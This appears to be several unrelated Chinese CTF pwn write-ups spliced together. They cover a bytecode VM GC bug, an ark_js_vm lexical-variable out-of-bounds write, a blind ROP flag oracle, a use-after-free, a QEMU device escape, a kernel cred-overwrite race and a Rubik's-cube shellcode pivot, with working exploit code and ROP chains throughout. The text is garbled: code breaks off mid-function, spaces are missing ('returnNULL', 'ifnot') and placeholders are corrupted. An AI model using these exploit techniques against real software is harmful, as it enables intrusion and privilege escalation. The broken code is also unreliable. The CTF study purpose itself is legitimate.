2. 题目分析
babel是OCaml编译的自研字节码虚拟机，stripped、PIE、Full RELRO、NX。main（0xd710）初始化后装PR_SET_NO_NEW_PRIVS与seccomp，白名单为read write close openat exit exit_group brk rt_sigprocmask，无execve，预期用ROP读/flag。主循环read(0,4)取长度、read(0,len)读进0x65e40的64KB缓冲区，再调babel_dispatch（0xdb80）；值栈、256个寄存器与1MB堆跨chunk保留，利用可拆成多次投递。分发表在0x75f60，合法输入字节仅0x00..0x19、0x20、0xfe、0xff。
值编码(堆偏移<<4)|tag：1 string、3 array、5 tuple、7 ref、9 buffer、偶数为整数（n>>1）。对象头+0为type（1=array、2=tuple、6不被扫描）、+8 size、+0x10 count、+0x14 len|0x80000000、+0x18 dataOff；tag-9数据在另一块4MB区（指针在0x76270）。关键指令：0x01 push imm64、0x08造array、0x0a/0x0b元素get/set、0x14造ref并将+0x18写绝对地址base+0x59098+8*kind、0x16 alloc、0x17/0x18经ext[slot]读写、0x19设ext、0x20调宿主函数。3个宿主函数（base+0x11de0起）会回调dispatch并在堆上分配对象。
GC在0xe710，cursor+size+0x10>cursor+0x8000时触发，根为值栈（0x97290，个数在0x97288）、寄存器区0x9f290与临时区。只标记type1/2的对象后整体左移压缩并重写根值。type6不被扫描，其子对象即使有引用也判成垃圾；被压缩对象留在不扫描区的陈旧偏移不清理，压缩后的活对象可能正好落到该偏移上。
漏洞一，空串1字节越界：0x31在长度为0时把size算成0x10，却写长度1|0x80000000、dataOff=off+0x20，指向下一个对象的header。sset(0)通过idx<len检查，可把下一个array的type改成6，让GC跳过它的元素。
漏洞二，setext检查写错：0x1e本应校验+0x14==0xffffffff，实际只查tag==9并要求+0x14==-1、+0x18<0x10。alloc出的tag-9对象+0x14是size，正常路径走不通；让tag-9值指向array（+0x14即-1、首元素偏移<0x10）即可通过，ext[slot]={addr,0x100000}，extget/extset变成任意地址按字节读写。
3. 解题过程
泄漏PIE。chunk1在0x00造U=array(1)并丢弃引用，0x20造R=ref(1)（+0x18=base+0x590a0），0x40造空串E（dataOff=0x60），0x60造V=array(1)（元素0为U）。用E把V的type改成6，压约32KB字符串触发GC：U无根被压缩掉，R从0x20左移到0x00，V[0]的旧偏移0正好指向R。

chunk2执行pushr(3); getf(0); getf(0); raw，V[0]取出(0<<4)|3，再取元素0读到R+0x18=base+0x590a0，base=leak-0x590a0，校验页对齐。

同法制造tag9指向array：0xC0造B=alloc(0x100)，0xC0+0x20造T=array(1)，0xC0+0x40造空串E2（dataOff=0xC0+0x60），0xC0+0x60造V2=array(1)（元素0为B）；丢B的引用、用E2把V2的type改成6，pushstr(b'Y'*0x8100)触发GC后B死亡、T落到0xC0，V2[0]读出(0xC0<<4)|9。

任意读写。混淆值留在寄存器7，每次pushr(7); getf(0); pushraw(addr); setext重设ext[0]，再批量extget(i)/extset(i)。

泄漏libc。read@GOT在base+0x58d30，读出后减0x11bd20得libc基址，回读\x7fELF校验。

拼ROP。链为close(0); open("/flag"); gets(buf); puts(buf); exit(0)：关fd0后open返回0，gets避开被open破坏的rdx。命令串、缓冲区与链写在base+0x100000的.bss。

劫持控制流。值栈个数在base+0x97288，在U=base+0x97290+8*count伪造ucontext：+0xa0写链地址、+0xa8写ret；把ext表的宿主函数指针base+0x75ec0改成setcontext+0x3d（mov rsp,[rdx+0xa0]），调用时rdx正是&value_stack[count]。发op 0x29、fn=0的chunk触发，flag从stdout输出。

L = dict(read=0x11bd20, pivot=0x4a960 + 0x3d, pop_rdi=0x10c08d, pop_rsi=0x110b7d,

         puts=0x87cc0, exit=0x47ba0)
p = remote(HOST, PORT)

pushraw = lambda v: b"\x01" + p64(v)
pushstr = lambda s: b"\x02" + p32(len(s)) + s
arr     = lambda n: b"\x08" + bytes([n])
getf    = lambda i: b"\x0a" + bytes([i])
sset    = lambda i: b"\x0d" + bytes([0, i])
mkref   = lambda k: b"\x14" + bytes([k])
alloc   = lambda n: b"\x16" + p32(n)
extget  = lambda i: b"\x17" + p32(i)
extset  = lambda i, b: b"\x18" + p32(i) + bytes([b])
setext  = lambda: b"\x19\x00"
rget    = lambda r: b"\x10" + bytes([r])
rset    = lambda r: b"\x11" + bytes([r])

def send(*ops):
    code = b"".join(ops)
    p.send(p32(len(code)) + code)

def rd(addr, n):
    send(rget(7), getf(0), pushraw(addr), setext(),
         *[x for i in range(n) for x in (extget(i), b"\x13")])
    return bytes(u64(p.recvn(8)) >> 1for _ in range(n))

def wr(addr, data):
    send(rget(7), getf(0), pushraw(addr), setext(),
         *[extset(i, c) for i, c in enumerate(data)])

2. 题目分析
ark_js_vm是官方样例宿主，只做JSNApi::CreateJSVM与JSNApi::Execute；libark_jsruntime.so是OpenHarmony 7.0/API24运行时，abc版本24.0.0.0，libc为Ubuntu 24.04的2.39。运行时用--asm-interpreter，JIT关闭，无seccomp与namespace。.abc是panda格式，加载只做结构解析，没有验证器，CodeData的寄存器数、槽位与指令立即数之间无交叉校验。
漏洞在ldlexvar/stlexvar（interpreter_assembly.cpp）：level与slot直接取自指令立即数，GetProperties(slot)转成TaggedArray::Get(slot+3)，边界检查只在release被裁掉的ASSERT里，实际地址为env+24+(slot+3)*8 = env+40+8*slot。短指令0x8a/0x8b的slot为8位，wide形式（前缀0xfd加0x0c/0x0d）可达65535，一条指令即以env为基址向前约512KB读写任意tagged value（对象指针、整数或double）。堆里各类对象连续分布，越界窗口能命中同一次分配序列的固定位置。
LexicalEnv：+0 hclass、+8 length、+16 globalEnv、+24 parentEnv、+32 scopeInfo、+40 env[0]。对象布局：ECMAObjecthash@8（SIZE=16）；JSArrayBufferdata@32,byteLength@40；JSTypedArrayviewedBuffer@32,byteLength@40,byteOffset@44,arrayLength@48,type@52；ByteArrayarrayLength@8,byteLength@12,data@16（内联）；TaggedArraylength@8,extraLength@12,data@16；JSNativePointerexternalPointer@8,deleter@16,data@24。u8.viewedBuffer存的是ab对象指针，取元素时才经ab.data→JSNativePointer.externalPointer，所以改ab.data不影响u8对ab的引用，byteLength也拦不住伪造指针；ByteArray数据内联在+16，不会被GC搬走，可当伪造对象工作区。
3. 解题过程
用es2abc编译模板abc：outer()内用被闭包捕获的secret强制生成LexicalEnv，依次分配scr=new Uint8Array(0x200)（堆内ByteArray，数据内联）、ab=new ArrayBuffer(0x100)、u8=new Uint8Array(ab)、vic=new ArrayBuffer(0x100)，再定义4个引用局部变量的探针p0~p3；p3带参数并做加法，以分配到实参寄存器v4。bundle形式下默认entry即第一个record。

闭包变量按声明顺序进env的slot，布局：slot 5为scr的ByteArray对象，slot 14为scr数据起点（env+40+8*14落在内联数据里），slot 82为ab.data，slot 92为ab对象指针。

打补丁。指令编码ldlexvar=8a <level> <slot>、stlexvar=8b <level> <slot>、lda v8=60 <v>、return=64，level恒0。前三个探针体以ldlexvar 0,0; sta v0（3c 00 61 00）开头，按出现顺序即p0~p2；p3用62 01 00 00 00 61 00 62 02定位。替换为p0: ldlexvar 0,5; stlexvar 0,14、p1: ldlexvar 0,14; stlexvar 0,82、p2: ldlexvar 0,92; stlexvar 0,14、p3: lda v4; stlexvar 0,14，长度对齐。

伪造NP：p0()取回B，假NP放D=B+16（scratch内联数据），D+8写目标地址；p3(ab)得Aab，wr(0,D); wr(8,Aab); p1()令ab.data指向D，u8窗口落在ab本身。之后只改scratch+8换目标，不能再动ab.data。

泄漏：wr(8,Avic); rdu(32)得vic的NP地址；窗口移到该NP后rdu(8)得native缓冲CB（ROP载体），rdu(16)得deleter=FreeBufferFunc，减0x2504b40得libark；读libark+0x2acbbf8的execv@got减0xef010得libc，页对齐失败则改用free@got（0x2ac07f8）减0xade30。GOT在GNU_RELRO内只读。

析构迁移：DestroyJSVM→~EcmaVM→ClearNativePointerList()对每个NP调Destroy()，执行deleter(env, externalPointer, data)，data在rdx。在CB写命令串与pop rdi;ret+system链，把deleter改成libc+0x5ef6f（mov rsp,rdx;ret）、data=CB，析构时栈切到CB。按(data+32)%16==8决定是否垫ret，payload也不能抛异常，否则走不到NP析构。

function outer() {

let scr = newUint8Array(0x200);
let ab = newArrayBuffer(0x100);
let u8 = newUint8Array(ab);
let vic = newArrayBuffer(0x100);
let p0 = function(){ return secret; }, p1 = function(){ return secret; };
let p2 = function(){ return secret; };
let p3 = function(x){ let t = 1; t = t + 2; t = t + 3; return x; };
return [p0, p1, p2, p3, scr, ab, u8, vic];
}
let g = outer(), p0 = g[0], p1 = g[1], p2 = g[2], p3 = g[3];
let scr = g[4], ab = g[5], u8 = g[6], vic = g[7];
function rd(o){let v=0,m=1;for(let i=0;i<8;i++){v+=scr[o+i]*m;m*=256;}return v;}
function wr(o,v){let m=1;for(let i=0;i<8;i++){scr[o+i]=Math.floor(v/m)%256;m*=256;}}
function rdu(o){let v=0,m=1;for(let i=0;i<8;i++){v+=u8[o+i]*m;m*=256;}return v;}

// 探针：p0=scr进scratch，p1=scratch进ab.data，p3=addrof
p0(); let B = rd(0), D = B + 16;

2. 题目分析
保护：amd64、PIE、Canary、NX、Full RELRO；seccomp只允许read、exit、exit_group。open_flag()在blind()前打开flag，fd固定为3；blind()关掉stdout/stderr并装seccomp，靠连接存活与否盲读。
main（0x200452）在rbp-0x60放0x58字节名字缓冲区，canary在rbp-8，输入上限0x88，可覆盖canary、saved rbp与saved rip；开头mov [rbp], rcx把__libc_csu_init存在saved rbp处，作为PIE泄露源。
get_input(dest,count)逐字节read(0,&c,1)，EOF直接exit(-1)，读满count或遇换行停止，且不写NUL，printf("Your name is: %s")会一直打印到内存中下一个0x00。
泄露：第一次名字输入0x58个A加B，B覆盖canary最低字节0x00，printf越过canary打印7字节，再打印[rbp]处的地址；canary=b"\x00"+leak[0x59:0x60]，base=u64(leak[0x60:0x68])-0x2005a0。泄露不足0x60字节就重连。
3. 解题过程
第二次名字输入0x88字节：A*0x58 + canary + p64(B+0x60) + p64(main+0x92) + A*0x18，B=base+0x601080。blind()后leave;ret使rsp=rbp=B+0x60、pop rbp=B、ret到main+0x92（0x2004e4），重走getnum与两次get_input。

重入后getnum读走"136\n"+"A"*11返回136，两次get_input(B,136)写同一blob：stage2.ljust(0x58,b"\0") + canary + p64(B) + p64(leave)。main再leave;ret两次，rsp落到stage2[1]。

stage2九个qword：[0, pop_rdi, dst, pop_rsi_r15, len(payload), 0, get_input, pop_rsp, dst]，先get_input(dst,len)读入payload，再由pop rsp切栈到dst，前3个qword被pop r13/r14/r15吃掉。

payload：dst+0为链，dst+0x220为accepted循环，dst+0x320为伪get_input栈帧，dst+0x380为256项函数表，总长0xb80。

CSU组装oracle：pop rbx/rbp/r12/r13/r14/r15;ret（0x2005fa）设rbx=0,rbp=1,r12=read@got,r13=3,r14=buf,r15=count后跳call [r12+rbx*8]（0x2005e0）。先read(3,scratch,offset)推进fd3偏移，再read(3,dst+slot*8,1)把flag字节写进下一组CSU pop的rbx槽最低字节（高7字节为0），得rbx=flag_byte；下一组设rbp=loop_area+16,r12=table，call [table+flag_byte*8]：命中跳到leave;ret切到accepted循环，不命中call 0崩溃，连接被关。

offset 10特判：p64(10)最低字节是0x0a，会让get_input提前结束，拆成两次read(3,scratch,5)。

def parse_leak(io):
    data = io.recvuntil(b"Now you have")
    leak = data.split(b"Your name is: ")[1].rstrip(b"\n")
    canary = b"\x00" + leak[0x59:0x60]
    base = u64(leak[0x60:0x68].ljust(8, b"\x00")) - CSU_INIT
    return canary, base

def build_bit_oracle(base, canary, offset, selector):
    dst = base + DST
    loop_area, frame, table = dst + 0x220, dst + 0x320, dst + 0x380
    scratch = base + SCRATCH
    words = [0, 0, 0]

    def call_read(fd, addr, cnt):
        words.extend([base + CSU_POP, 0, 1, base + READ_GOT, fd, addr, cnt, base + CSU_CALL])
        words.extend([0] * 7)

    if offset == 10:                  # 0x0a会截断输入
        call_read(3, scratch, 5)
        call_read(3, scratch, 5)
    elif offset:
        call_read(3, scratch, offset)

    dest_index = len(words) + 5
    call_read(3, 0, 1)
    char_index = len(words) + 1
    words.extend([base + CSU_POP, 0, loop_area + 16, table, 0, 0, 1, base + CSU_CALL])
    words[dest_index] = dst + char_index * 8
    chain = flat(words)
    stage2 = [0, base + POP_RDI, dst, base + POP_RSI_R15, 0xb80, 0,
              base + GET_INPUT, base + POP_RSP, dst]
    blob = flat(stage2).ljust(0x58, b"\x00") + canary + p64(base + B) + p64(base + LEAVE)

    loop = b"\x00" * 16 + flat(0, base + POP_RBP, frame + 13, base + POP_RDI, 0,
                               base + POP_RSI_R15, frame, 0, base + READ_PLT, base + 0x200359)
    frame_bytes = b"\x00" * 5 + canary + b"\x00" * 8
    frame_bytes += p64(base + POP_RSP) + p64(loop_area)
    table_bytes = b"".join(p64(base + LEAVE if c in selector else0) for c in range(256))
    payload = bytearray(0xb80)
    payload[:len(chain)] = chain
    payload[0x220:0x220 + len(loop)] = loop
    payload[0x320:0x320 + len(frame_bytes)] = frame_bytes
    payload[0x380:] = table_bytes
    return blob, bytes(payload)

import re, socket, struct, time

HOST, PORT = "<靶机地址>", 9999

def p64(x):
    return struct.pack("<Q", x)

class Game:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        self.s.settimeout(0.4)

    def read(self, wait=0.8):
        end, out = time.time() + wait, b""
        while time.time() < end:
            try:
                chunk = self.s.recv(65536)
                ifnot chunk:
                    break
                out += chunk
            except socket.timeout:
                if out:
                    break
        return out.decode("latin-1", "replace")

    def cmd(self, line, wait=0.8):
        self.s.sendall((line + "\n").encode())
        return self.read(wait)

    def show(self, slot):
        text = self.cmd("mw show")
        line = [x for x in text.splitlines() if x.strip().startswith("[%d]" % slot)][0]
        return [int(v, 16) for v in re.findall(r"0x[0-9a-f]+", line)]

    def whisper(self, slot, data):
        self.cmd("mw whisper %d %s" % (slot, data.hex()))

def poison(g, A, target):
    payload = (p64((A >> 12) ^ target) + b"\0" * 0x70 + p64(0x101))[:<端口>]
    g.whisper(0, payload)
    g.whisper(1, payload)

2. 题目分析
服务接收64行画布，按块元素校验后计算加权和，再从/proc/self/mem的struct_ptr + D读1字节。校验按C字符串语义取到NUL为止，行首写NUL即被当作空元素放行；加权和却按整行原始长度累加，NUL及其后字节照样计入：
D = Σ sign8(canvas[i]) × (i + 1)
addr = struct_ptr + D

行内字节可取-128～127，行尾换行权重10，正负权重组合可精确凑出任意偏移。读出的字节与画布、请求序号一起进入ChaCha20-Poly1305派生：两段12字节nonce由画布逐字节异或得到，ChaCha20分组生成二级密钥与nonce，Poly1305标签前12字节与密文异或，前8字节对文件长度-切片长度+1取模得OFFSET，后4字节低6位加1得LEN。
未知量只有那1字节：本地复现同一PRF，对0～255穷举预测(OFFSET, LEN)与远端返回比对即可反推内存字节，碰撞时换画布与序号重问。于是得到每请求1字节的任意读原语，同时把奖励HEX当作forgery的切片：9020次请求拼出26772/26784字节，缺失仅在ELF头与末尾节表，代码段完整。
运行版与伪造版不是同一次构建（输出函数分别在PIE+0x1740与+0x1750），扩容分支的差异即漏洞：

free(old);                          // +0x1ac5
memcpy(old, input, input_length);   // +0x1ace 取回旧指针，+0x1b54 写入

free后仍向旧指针写入，构成use-after-free；复制长度取整行原始长度，上限1023。!标记的逻辑长度受48字节限制，但标记中含NUL时复制仍按整行长度进行，所以一条241字节的!行既能越过容量阈值引发扩容与free，又能把240字节写进已释放的0x100大小类块。

def row_for(delta):
    # 第i行权重i+1，从高权重向低权重贪心分解，末位微调使误差归零
    row = [0] * 64
    for i in range(63, -1, -1):
        w = i + 1
        step = max(-127, min(127, delta // w))
        row[i] = step & 0xff
        delta -= step * w
    assert delta == 0
    returnb'\n'.join(bytes([v]) for v in row)

class Oracle:
    def __init__(self, host, port, predict):
        self.s = socket.create_connection((host, port), timeout=5)
        self.s.settimeout(30)
        self.predict = predict          # predict(seq, byte) -> (OFFSET, LEN)
        self.seq = 0
        self.prompt()

    def prompt(self):
        buf = b''
        whileb'[INPUT]:\n'notin buf:
            buf += self.s.recv(65536)
        return buf

    def byte_at(self, delta):
        canvas = row_for(delta) + b'\n'
        for _ in range(4):
            self.seq += 1
            self.s.sendall(canvas)
            m = REWARD.search(self.prompt())
            off, ln = int(m[1], 16), int(m[2])
            cand = [b for b in range(256) if self.predict(self.seq, b) == (off, ln)]
            if len(cand) == 1:
                return cand[0]
        raise RuntimeError('ambiguous byte, retry with new canvas')

    def qword(self, delta):
        return sum(self.byte_at(delta + k) << (8 * k) for k in range(8))

def enc_len(n):
    out = b''
    whileTrue:
        low, n = n & 0x7f, n >> 7
        out += bytes([low | (0x80if n else0)])
        ifnot n:
            return out

def pkt(typ, body):
    return bytes([typ]) + enc_len(len(body)) + body

def s16(b):
    return struct.pack('>H', len(b)) + b

def subscribe(mid, topic):
    return pkt(0x82, struct.pack('>H', mid) + s16(topic) + b'\x00')

def unsubscribe(mid, topic):
    return pkt(0xa2, struct.pack('>H', mid) + s16(topic))

2. 题目分析

设备功能与偏移：
设备
作用

ctf-nic按DMA描述符向guest物理地址写数据，落到BAR区间即触发其他设备的MMIO

ctf-watchdog分配/释放0x58字节定时器对象，reset只换对象不停表

ctf-audio分配/释放0x58缓冲，可从guest内存拷入数据

ctf-msg对象创建/释放/调用，本链未使用

所有设备的BAR0都是0x1000，回调先取addr & ~3定位寄存器，故每次写入都是4字节寄存器写。-device顺序即槽位：nic为03.0、watchdog为03.1、audio为03.2、logger为03.3。各设备realize时把同一个全局上下文指针存到dev+0xb10，上下文第0项就是watchdog的0x58定时器对象，NIC的RX收尾正是从它取回调。
watchdog：+0x10 reset分配新的0x58对象并g_free旧对象，+0x20写message并装载定时器，+0x28释放对象并把共享上下文里的指针置空。对象布局为+0x00 QEMUTimer指针、+0x08起0x40字节message、+0x48回调指针、+0x50状态字；reset全程没有timer_del，已装载的QEMUTimer仍指向旧块，默认1000毫秒超时，构成UAF。
audio：+0x00分配0x58缓冲，+0x04释放并置空，+0x08/+0x0c为64位guest物理源地址，+0x10为最大长度，+0x14commit从源地址拷min(len, 0x50)字节到缓冲，正好覆盖块首到块尾。
logger：+0x00/+0x04为目的物理地址，+0x08为宿主缓冲内偏移，+0x0c为长度，+0x10触发。回调栈上缓冲0x1000字节，长度用0x1000 - off取余量；off为32位无符号，取0x1010时余量下溢成极大值，min的结果就是len，源指针越过缓冲末尾，栈内容被DMA回guest。
nic：+0x10/+0x14为RX描述符物理地址，+0x1c触发RX。描述符长0x28：
struct desc {
    uint64_t a0; uint32_t l0; uint32_t r0;
    uint64_t a1; uint32_t l1; uint32_t r1;
    uint64_t st;
};

RX从内部缓冲向a0、a1各写l0、l1字节（单段上限0x800），最后向st写4字节值1，三个地址都是guest物理地址，落在BAR区间就被转发成MMIO写。RX入口先把ctx->timer缓存到栈上，DMA与中断处理期间不再回读，收尾直接用缓存指针call [obj+0x48]，参数固定为obj+8。
于是时序为：在vCPU线程对watchdog做+0x10 reset，让新对象落在该线程的arena；用audio做7次alloc/free填满0x60类的tcache；RX入口缓存旧定时器；描述符依次写watchdog+0x28（释放）、audio+0x00（取回同一块）、audio+0x14（拷入0x50字节，覆盖+0x08的命令串与+0x48的回调）。释放、复用、覆盖必须落在同一次RX回调内且st在a0、a1之后，否则回调仍指向原函数，或旧定时器在覆盖前到期。g_malloc0走calloc不取tcache，g_free在tcache满时进fastbin，所以第8次释放才进入fastbin、被下一次calloc取回，7是tcache每类的槽数。
3. 解题过程
枚举四个BAR，mmap其resource0，向配置空间+0x04写command |= 7打开MMIO与bus master；mmap一页匿名内存并mlock，通过pagemap取物理地址。这一页同时充当logger的DMA目的、audio的DMA源与NIC描述符存放处：

uint64_t entry;
pread(fd, &entry, 8, (ptr >> 12) * 8);
pa = ((entry & ((1ULL << 55) - 1)) << 12) | (ptr & 0xfff);

向logger写{pa, 0x1010, 0x80, 1}触发越界拷贝，从guest页+0x08读出返回地址，校验低12位为0x2c7后base = ret - 0x4132c7，system_plt = base + 0x2e2c90。

清空guest页，+0x08写/bin/cat /tmp/flag_f，+0x48写system_plt，audio配好源地址与0x50长度，commit时把命令与回调拷进定时器块。

对watchdog执行+0x10 reset（新对象落vCPU arena），audio做7次alloc/free填满tcache。

在guest页+0x100构造描述符，把其物理地址写入NIC+0x10/+0x14，写NIC+0x1c触发RX：

d->a0 = bar[1] + 0x28;  d->l0 = 4;   // watchdog free
d->a1 = bar[2];         d->l1 = 4;   // audio alloc
d->st = bar[2] + 0x14;               // audio commit

RX收尾用缓存的旧指针取+0x48得到system_plt，以已变成命令串的+0x08为唯一参数调用，flag经QEMU的stdout（即串口socket）回显。

上传：宿主侧gzip -9压缩、base64按76列切行包进heredoc，guest侧uudecode、gzip -dc、chmod +x后运行，每行之间留约25ms避免ttyS0丢字符；收尾在guest执行poweroff -f，否则QEMU空跑到600秒超时。

#define VMA_COUNT 50000UL

staticpid_t g_tgid;
staticuintptr_t g_vma;

static void *vma_helper(void *arg)
{
for (;;)
for (unsignedlong i = 0; i < VMA_COUNT; i++)
   mprotect((void *)(g_vma + i * 0x1000), 0x1000,
     (i & 1) ? PROT_READ : (PROT_READ | PROT_WRITE));
returnNULL;
}

static void *killer(void *arg)
{
pid_t tid = (pid_t)(uintptr_t)arg;

for (;;)
if (syscall(SYS_tgkill, g_tgid, tid, 0) < 0) {
   kill(tid, SIGKILL); /* TID交换已完成 */
   returnNULL;
  }
}

static void *exec_thread(void *arg)
{
struct sigevent sev = { .sigev_notify = SIGEV_NONE };
struct itimerspec its = { .it_value = { .tv_sec = 3600 } };
pid_t *tid = arg;
timer_t t;

 *tid = syscall(SYS_gettid);
if (!timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t))
  timer_settime(t, 0, &its, NULL);
 execl("/proc/self/exe", "poc", NULL);
returnNULL;
}

/* 子进程：helper争锁，exec线程被杀后留下悬空node */
static pid_t spawn_stale(void)
{
pid_t pid = fork(), tid = 0;
pthread_t th[4];

if (pid)
return pid;
 g_tgid = getpid();
for (int i = 0; i < 3; i++)
  pthread_create(&th[i], NULL, vma_helper, NULL);

  usleep(1000);

/* 伪造A/C/M三节点，第二次rb_erase把fake_cred写进task->cred */
static void forge_tree(uint8_t *page, uint64_t task, uint64_t cred)
{
uint64_t *A = (uint64_t *)(page + 0x200), *C = A + 0x20, *M = A + 0x30;

 A[0] = (uint64_t)C; A[2] = task + 0xd00; A[3] = task + 0xca0;
 C[0] = (uint64_t)M; C[1] = (uint64_t)A;  C[3] = task + 0xca0;

题目说明：古堡幽深，六弦琴久寂；今琴灵忽醒，以六音为律，封终章碑文于二十乐章之中。每章皆藏残章一枚，须入秘境亲取。至少破三章，石碑乃现；集齐二十残章，碑文方得重铸。
2. 题目分析
二十章流程与双角色咒文服务在一条TCP连接里连续进行二十个乐章，残章、结算与终章密文都绑定在这条会话上。每章先输出target: 加80个十六进制字符（40字节魔方状态），随后给出菜单1) 调弦 2) 翻阅琴谱 3) 开辟共鸣腔 4) 弹奏 5) 哑弦 6) 离去。菜单4接收至多31字节咒文，校验器比对通过后回显ACCEPT，同一串字节紧接着作为x86-64机器码执行；发送6才进入下一章，外层wrapper在离开时才判定“残章到手”并计分。
target的40字节按cp[8] || co[8] || ep[12] || eo[12]切分，依次是角块置换、角块朝向、棱块置换、棱块朝向；复原态为cp=0..7、co全1、ep=0..11、eo全1。转动表是一段0x118字节的二进制，六个面依次存放8字节CP、8字节CO、12字节EP、12字节EO。执行转动时置换按表重排索引，角块朝向用GF(4)乘法，棱块朝向模3相乘。朝向从1开始计数而不是从0，这是它和常见Kociemba面串最大的差别，也是不能直接套现成求解器的原因。
校验器只读原始字节，byte % 6决定执行URFDLB中的哪一个顺时针四分之一转，与字符、编码无关。同一串字节随后又被当作代码执行，于是每个字节承担双重语义：余数必须让魔方走向target，数值本身又必须是有用的一字节指令。0x5a（90）既是U又是pop rdx，0x5c（92）既是F又是pop rsp，0xc3（195）既是D又是ret。这条“余数与指令同时成立”的重合，就是把魔方公式变成栈迁移跳板的全部基础。
可用的单字节等价指令为：U→0x90 nop、R→0x91 xchg eax,ecx、F→0xf8 clc、D→0xf9 stc、L→0x64 fs前缀、B→0x65 gs前缀；L后面若还有公式步，可写成0xb2 imm8（mov dl,imm8），让立即数顺带承担下一面的余数，一次编码两步。枢轴之后剩下的公式字节无需执行，写成0x30+面序号即可满足校验。31字节上限来自菜单4的行缓冲，咒文内不能出现换行；一旦公式里凑不出“pop面→F→D”这类子序列，就必须换一条公式。
搜索与预计算表四分之一转下随机目标通常要18~21步，31字节预算看似宽裕，实际搜索空间约4.3×10¹⁹，纯在线搜索赶不上章节时限。做法是先把复原侧的投影树建好：用Kociemba的twist/flip/slice打包成(twist*2048+flip)*495+slice，得到约5070万个投影节点，从复原态正向展开深度10~12；求解时从target反向展开深度9~10，两边在投影坐标处相交即得一条不超过22步的公式，再沿父指针回放出URFDLB序列。压缩版投影树约1GiB、几十秒建完，建表必须在连接之前完成，否则一章超时就会连累整条会话。
搜索目标不只是“能还原”，而是“公式里含有可编码的枢轴子序列”。程序依次尝试三种入口：pop面→F→D配pop rsp;ret，pop面→D→D→D配pop rbp;leave;ret，以及更宽松的pop/BL/D组合。若当前公式编不出，就对目标做24种整体旋转或24种镜像后重新求解，再把公式逐字符逆变换回原坐标。同一目标在不同视角下步数与形状都不同，换个视角往往就能凑出所需子序列。
菜单1/2与栈布局菜单1把恰好112字节的祷文写进BSS的PIE+0x5060，这里就是ROP链的落点。菜单2把路径按原始字节读入栈缓冲，最多255字节，其中偏移0xf0的8字节槽位正好会被枢轴当作返回地址弹出，填PIE+0x5060即可；走leave入口时填PIE+0x5058，让leave先弹掉一个无害qword再ret到PIE+0x5060。路径载荷要以短串加NUL开头，末尾不能带换行，并用填充凑满255字节，这样读入会写满到0xf0之后的槽位，而不是在换行处提前截断。
用/proc/64/auxv取地址PIE与ld.so基址每次运行都随机，但菜单2可以读任意路径。/proc/64/auxv是容器内服务父进程的辅助向量：16字节一对<QQ>（tag、value），从AT_SYSINFO_EHDR(33)开始，遇tag==0结束。AT_PHDR(3)指向内存中的程序头，而ELF程序头在文件内偏移0x40处，故PIE = AT_PHDR - 0x40；AT_BASE(7)就是动态链接器基址。gadget全部取自ld.so：pop rdi;pop rbp;ret在ld+0x25AC，pop rsi;pop rbp;ret在ld+0x599B，pop rdx;leave;ret在ld+0x1F5FB，pop rax;ret在ld+0x1548B，syscall;ret在ld+0x16629附近。选auxv而不选/proc/self/maps，是因为它是定长二进制对，一次就读到加载器基址，省掉先泄漏libc的环节；PID64是容器PID命名空间里服务的固定编号，/proc/64/与后面process_vm_writev(64,...)指向同一个父进程。
fork子进程与process_vm_writev回写菜单1/2/4都是一次性动作，状态由BSS页PIE+0x5000里的三个标记控制：tuned在页内偏移0x40（4字节），read_once与spell_once在0x48（共8字节）。校验通过后服务fork，由子进程执行咒文；子进程看到的标记已经置1，执行完就退出，父进程对此一无所知。因此只在子进程里清标记毫无用处，必须把子进程改好的整页写回父进程。第一段祷文正是这个序列：mprotect(PIE+0x5000,0x1000,7)把该页改成可读写可执行，随后31字节代码清零[PIE+0x5048]与[PIE+0x5040]，再用process_vm_writev（系统调用号311）把本进程的这一页写进PID64的同址页。成功后父进程的菜单1/2/4重新可用，同一章内还能第二次调弦、翻阅、弹奏。
31字节够用，是因为进入这段代码时寄存器已经就位：mprotect成功返回RAX=0，同时RDI=PIE+0x5000、RSI=0x1000、RDX=7，RBP里还留着call要用的syscall;retgadget。代码只需“清零两个槽位→压入iov_len与iov_base→rsi=mov r10→dl=1、r8d=1、r9d=0→rdi=64→ax=311→call rbp”。local与remote两组iovec可以指向同一地址，因为fork之后父子地址空间布局完全一致，PIE+0x5000在两边都是同一页。
/flag→/tmp/x软链与过滤绕过菜单2对含flag的路径会拒绝，但拒绝发生在255字节读入栈缓冲之后：0xf0槽位照样被写好，read_once也没有被消耗，所以随后还能再读一次文件。第二段祷文用纯ROP调__NR_symlink=88，把/flag链到/tmp/x；两条路径字符串直接写在祷文尾部（+80与+86），所有系统调用都经ld.so里的syscall;retgadget发起，避免原始0f 05字节被wrapper的指令过滤拦下。之后读/tmp/x（路径不含flag）就得到66位十六进制残章，离开该章时外层才确认计分。
十八枚残章与终章密钥gift.elf读入flag文件，用getrandom取32字节密钥，为每个密钥字节生成一个17次多项式，二十章各给出一组取值，并打印20条收据和flag.enc。每条残章66位hex即33字节：1字节来源标签加32字节份额。17次多项式由18个点唯一确定，所以至少需要18条有效记录；少于18条时插值出的密钥必然错误，AES-GCM的tag校验也会失败。标签只用于区分来源，插值时按计分顺序重编为x=1..18，第15章缺章不会在横坐标上留下空洞，重编号后的点集仍落在同一组17次多项式上，零处取值不变。
3. 解题过程
会话时序与帧定界整条链只开一个socket，先等target: <80hex>出现，然后每章按固定顺序走：读auxv（菜单2）→调弦（菜单1，写第一段祷文）→布栈（菜单2，写255字节）→弹奏（菜单4，发咒文）→确认两次ACCEPT→读/tmp/x取残章→发6离开。菜单提示是固定字节串卷轴: 、祷文: 、咒文: ，菜单尾部是6) 离去\n> ；收发必须按字节匹配，不能用行读取，因为auxv回显含NUL和任意二进制。
魔方搜索放在后台线程与网络IO并行：每章一开始就把target交给线程，等auxv读完、祷文写完再取结果，搜索时间与IO时间重叠，不会叠加到章节时限上。wrapper有章节超时，超时会主动推进到下一章并打印新的target；此时旧章已无法提交，程序检测到“未请求的target”就改用新目标继续，该章记为未计分，避免中断整条链。
